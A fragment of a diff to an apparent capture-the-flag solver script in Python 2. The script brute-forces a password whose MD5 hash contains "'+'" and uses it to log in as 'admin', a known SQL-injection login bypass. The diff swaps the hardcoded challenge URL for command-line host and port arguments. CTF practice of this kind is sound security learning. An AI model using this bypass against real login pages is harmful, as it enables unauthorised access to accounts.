@@ -29,11 +29,20 @@ def getPassword():
         if "'+'" in getMd5(password):
             return password
 
+if len(sys.argv) != 3:
+    print "Usage: "
+    print "\tpython %s [HOST] [PORT]" % (sys.argv[0])
+    exit(1)
+
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+url = "http://%s:%d/" % (host, port)
+
 print "[+] Searching password..."
 password = getPassword()
 print "[+] Found : [%s]" % (password)
 
-url = "http://web.sniperoj.cn:10004/"
 data = {
     "username": "admin",
     "password": password,
